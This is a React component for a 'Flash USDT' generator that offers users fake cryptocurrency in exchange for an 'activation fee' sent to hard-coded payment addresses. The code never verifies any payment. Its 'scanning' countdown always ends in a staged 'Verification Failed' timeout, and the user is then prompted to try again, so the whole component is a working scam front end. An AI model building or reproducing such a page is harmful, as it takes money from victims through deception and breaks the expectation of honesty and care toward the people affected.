
import React, { useState, useEffect } from 'react';
import { PACKAGES, NETWORKS, PAYMENT_ADDRESSES } from '../constants';
import { Package, Network } from '../types';

const Generator: React.FC = () => {
  const [step, setStep] = useState(1);
  const [selectedPackage, setSelectedPackage] = useState<Package | null>(null);
  const [receivingNetwork, setReceivingNetwork] = useState<Network | null>(null);
  const [paymentNetwork, setPaymentNetwork] = useState<Network | null>(null);
  const [userAddress, setUserAddress] = useState('');
  const [processing, setProcessing] = useState(false);
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [countdown, setCountdown] = useState(120); // 2 minutes
  const [isFailed, setIsFailed] = useState(false);

  useEffect(() => {
    let timer: number;
    if (isConfirmed && countdown > 0 && !isFailed) {
      timer = window.setInterval(() => {
        setCountdown(prev => {
          if (prev <= 1) {
            setIsFailed(true);
            clearInterval(timer);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [isConfirmed, countdown, isFailed]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handlePackageSelect = (pkg: Package) => {
    setSelectedPackage(pkg);
    setStep(2);
  };

  const handleReceivingNetworkSelect = (network: Network) => {
    setReceivingNetwork(network);
    setStep(3);
  };

  const handleAddressSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (userAddress.trim().length > 10) {
      setStep(4);
    }
  };

  const handlePaymentNetworkSelect = (network: Network) => {
    setPaymentNetwork(network);
    setStep(5);
  };

  const handleConfirmPayment = () => {
    setProcessing(true);
    setTimeout(() => {
      setProcessing(false);
      setIsConfirmed(true);
    }, 2000);
  };

  const resetGenerator = () => {
    setStep(1);
    setSelectedPackage(null);
    setReceivingNetwork(null);
    setPaymentNetwork(null);
    setUserAddress('');
    setIsConfirmed(false);
    setIsFailed(false);
    setCountdown(120);
  };

  return (
    <div className="max-w-4xl mx-auto py-12">
      {/* Steps Indicator */}
      {!isConfirmed && (
        <div className="flex items-center justify-center gap-2 md:gap-4 mb-12">
          {[1, 2, 3, 4, 5].map((s) => (
            <div key={s} className="flex items-center">
              <div className={`w-8 h-8 md:w-10 md:h-10 rounded-full flex items-center justify-center font-bold text-xs md:text-sm transition-all ${step >= s ? 'bg-blue-600 text-white shadow-lg shadow-blue-600/30' : 'bg-slate-800 text-slate-500 border border-white/5'}`}>
                {s}
              </div>
              {s < 5 && <div className={`h-px w-4 md:w-8 mx-1 md:mx-2 transition-all ${step > s ? 'bg-blue-600' : 'bg-slate-800'}`} />}
            </div>
          ))}
        </div>
      )}

      {step === 1 && (
        <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
          <div className="text-center">
            <h2 className="text-3xl font-bold mb-2">Select Your Plan</h2>
            <p className="text-slate-400">Choose the amount of Flash USDT you wish to generate</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {PACKAGES.map((pkg) => (
              <div 
                key={pkg.id}
                onClick={() => handlePackageSelect(pkg)}
                className="group relative bg-slate-900 border border-white/10 p-8 rounded-3xl cursor-pointer hover:border-blue-500/50 transition-all hover:translate-y-[-4px]"
              >
                <div className="absolute top-4 right-4 text-[10px] font-bold text-blue-500 uppercase tracking-widest">{pkg.label}</div>
                <div className="space-y-4">
                  <div className="text-4xl font-black text-white">{pkg.amount.toLocaleString()}<span className="text-xs ml-1 text-slate-500">USDT</span></div>
                  <div className="flex items-center justify-between">
                    <span className="text-slate-400 text-sm">Protocol Fee</span>
                    <span className="font-bold text-green-500">${pkg.price}</span>
                  </div>
                  <button className="w-full py-3 bg-slate-800 group-hover:bg-blue-600 rounded-xl font-bold transition-all text-sm">Choose This Plan</button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {step === 2 && (
        <div className="space-y-8 animate-in fade-in slide-in-from-right-4 duration-500">
          <div className="text-center">
            <h2 className="text-3xl font-bold mb-2">Receiving Network</h2>
            <p className="text-slate-400">Select the network for receiving your {selectedPackage?.amount.toLocaleString()} USDT</p>
          </div>
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
            {NETWORKS.map((net) => (
              <div 
                key={net.id}
                onClick={() => handleReceivingNetworkSelect(net.id as Network)}
                className="p-6 bg-slate-900 border border-white/10 rounded-2xl cursor-pointer hover:bg-slate-800 hover:border-blue-500 transition-all flex flex-col items-center gap-4 text-center group"
              >
                <img src={net.icon} alt={net.name} className="w-12 h-12 rounded-full grayscale group-hover:grayscale-0 transition-all" />
                <span className="font-bold text-sm">{net.name}</span>
              </div>
            ))}
          </div>
          <button onClick={() => setStep(1)} className="block mx-auto text-slate-500 hover:text-white text-sm font-medium transition-colors">← Back to Plans</button>
        </div>
      )}

      {step === 3 && (
        <div className="max-w-md mx-auto space-y-8 animate-in fade-in slide-in-from-right-4 duration-500">
          <div className="bg-slate-900 border border-white/10 p-8 rounded-3xl space-y-6">
            <div className="text-center">
              <h2 className="text-2xl font-bold mb-2">Destination Address</h2>
              <p className="text-slate-400 text-sm">Enter your official {receivingNetwork?.split(' ')[0]} address</p>
            </div>
            <form onSubmit={handleAddressSubmit} className="space-y-4">
              <div className="space-y-2">
                <label className="text-xs font-bold text-slate-500 uppercase tracking-widest">{receivingNetwork?.split(' ')[0]} Address</label>
                <input 
                  type="text" required value={userAddress} onChange={(e) => setUserAddress(e.target.value)}
                  placeholder={`Enter your ${receivingNetwork?.split(' ')[0]} address...`}
                  className="w-full bg-slate-950 border border-white/10 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500 transition-colors font-mono"
                />
              </div>
              <button 
                type="submit" disabled={userAddress.trim().length < 10}
                className="w-full py-4 bg-blue-600 hover:bg-blue-500 disabled:bg-slate-700 text-white font-bold rounded-xl shadow-lg transition-all active:scale-95"
              >
                Continue to Payment Method
              </button>
            </form>
          </div>
          <button onClick={() => setStep(2)} className="block mx-auto text-slate-500 hover:text-white text-sm font-medium transition-colors">← Change Receiving Network</button>
        </div>
      )}

      {step === 4 && (
        <div className="space-y-8 animate-in fade-in slide-in-from-right-4 duration-500">
          <div className="text-center">
            <h2 className="text-3xl font-bold mb-2">Fee Payment Method</h2>
            <p className="text-slate-400">Choose the network to pay the ${selectedPackage?.price} activation fee</p>
          </div>
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
            {NETWORKS.map((net) => (
              <div 
                key={net.id}
                onClick={() => handlePaymentNetworkSelect(net.id as Network)}
                className="p-6 bg-slate-900 border border-white/10 rounded-2xl cursor-pointer hover:bg-slate-800 hover:border-blue-500 transition-all flex flex-col items-center gap-4 text-center group"
              >
                <img src={net.icon} alt={net.name} className="w-12 h-12 rounded-full grayscale group-hover:grayscale-0 transition-all" />
                <span className="font-bold text-sm">{net.name}</span>
              </div>
            ))}
          </div>
          <button onClick={() => setStep(3)} className="block mx-auto text-slate-500 hover:text-white text-sm font-medium transition-colors">← Back to Address</button>
        </div>
      )}

      {step === 5 && (
        <div className="max-w-2xl mx-auto animate-in zoom-in-95 duration-500">
          <div className="bg-slate-900 border border-white/10 rounded-3xl overflow-hidden shadow-2xl">
            <div className="p-8 space-y-6">
              <div className="text-center space-y-2">
                <div className={`w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${isConfirmed ? (isFailed ? 'bg-red-500/20' : 'bg-green-500/20') : 'bg-blue-500/20'}`}>
                  {isConfirmed ? (
                    isFailed ? (
                      <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><line x1="18" x2="6" y1="6" y2="18"/><line x1="6" x2="18" y1="6" y2="18"/></svg>
                    ) : (
                      <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                    )
                  ) : (
                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                  )}
                </div>
                <h2 className="text-2xl font-bold">{isConfirmed ? (isFailed ? 'Verification Failed' : 'Scanning Protocol') : 'Activation Required'}</h2>
                <p className="text-slate-400">
                  {isFailed ? 'No transaction found within the protocol timeframe.' : 'Send the activation fee to the secure address below.'}
                </p>
              </div>

              <div className="bg-slate-950 p-6 rounded-2xl border border-white/5 space-y-4">
                <div className="flex justify-between items-center text-sm">
                  <span className="text-slate-500">Generating</span>
                  <span className="font-bold text-blue-400">{selectedPackage?.amount.toLocaleString()} USDT</span>
                </div>
                <div className="flex flex-col gap-1 text-sm border-t border-white/5 pt-4">
                  <span className="text-slate-500">To Wallet ({receivingNetwork?.split(' ')[0]})</span>
                  <span className="font-mono text-[10px] text-slate-300 break-all bg-white/5 p-2 rounded leading-tight">{userAddress}</span>
                </div>
                <div className="flex justify-between items-center text-sm border-t border-white/5 pt-4">
                  <span className="text-slate-500">Payment Network</span>
                  <span className="font-bold">{paymentNetwork}</span>
                </div>
                <div className="h-px bg-white/5 w-full" />
                <div className="flex justify-between items-center">
                  <span className="text-slate-500 font-bold uppercase tracking-wider text-xs">Protocol Activation Fee</span>
                  <span className="font-mono text-xl font-bold text-white">${selectedPackage?.price} USDT</span>
                </div>
              </div>

              {!isConfirmed && (
                <div className="space-y-4 animate-in slide-in-from-top-2">
                  <label className="text-xs font-bold text-slate-500 uppercase tracking-widest">Send Fee To ({paymentNetwork?.split(' ')[0]})</label>
                  <div className="bg-slate-950 p-4 rounded-xl border border-blue-500/20 flex items-center justify-between gap-4">
                    <code className="text-xs md:text-sm font-mono text-blue-300 break-all">{PAYMENT_ADDRESSES[paymentNetwork!] || '0x...'}</code>
                    <button 
                      onClick={() => {
                        navigator.clipboard.writeText(PAYMENT_ADDRESSES[paymentNetwork!] || '');
                        alert("Address copied to clipboard");
                      }}
                      className="p-2 bg-blue-600 rounded-lg shrink-0 hover:scale-105 active:scale-90 transition-all"
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                    </button>
                  </div>
                  
                  <button 
                    onClick={handleConfirmPayment}
                    disabled={processing}
                    className="w-full py-5 bg-blue-600 hover:bg-blue-500 disabled:bg-slate-700 text-white font-bold rounded-xl shadow-xl shadow-blue-600/20 transition-all active:scale-95 flex items-center justify-center gap-3 uppercase tracking-widest text-sm"
                  >
                    {processing ? (
                      <><svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Initializing Protocol...</>
                    ) : 'I Have Sent The Payment'}
                  </button>
                </div>
              )}

              {isConfirmed && !isFailed && (
                <div className="p-6 bg-green-500/10 border border-green-500/20 rounded-2xl text-center space-y-4 animate-in fade-in zoom-in-95">
                  <div className="flex flex-col items-center gap-2">
                    <div className="w-full bg-slate-800 h-2 rounded-full overflow-hidden">
                      <div className="bg-green-500 h-full animate-[progress_120s_linear]" style={{ width: '0%' }} />
                    </div>
                    <div className="flex items-center justify-between w-full">
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                        <span className="text-[10px] font-mono font-bold text-red-400 uppercase">Awaiting Tx</span>
                      </div>
                      <span className="font-mono text-sm font-bold text-slate-300">{formatTime(countdown)}</span>
                    </div>
                  </div>
                  <p className="text-xs text-slate-400 leading-relaxed italic">
                    "Scanning blockchain layers for hash confirmation on {paymentNetwork?.split(' ')[0]}... Please remain on this screen."
                  </p>
                </div>
              )}

              {isFailed && (
                <div className="space-y-4 animate-in fade-in slide-in-from-top-4">
                  <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-xl text-center">
                    <p className="text-red-400 text-sm font-bold">Error: Transaction Timeout (CODE: 408)</p>
                  </div>
                  <button 
                    onClick={resetGenerator}
                    className="w-full py-4 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-xl transition-all"
                  >
                    Try Again
                  </button>
                </div>
              )}

              <p className="text-[10px] text-center text-slate-500">Flash generations are valid for 90 days across all major platforms.</p>
            </div>
            
            {!isConfirmed && (
              <button 
                onClick={() => setStep(4)}
                className="w-full py-4 bg-slate-950/50 text-slate-500 hover:text-white text-xs font-bold uppercase tracking-widest transition-colors border-t border-white/5"
              >
                ← Change Payment Method
              </button>
            )}
          </div>
        </div>
      )}
      <style>{`
        @keyframes progress {
          from { width: 0%; }
          to { width: 100%; }
        }
      `}</style>
    </div>
  );
};

export default Generator;
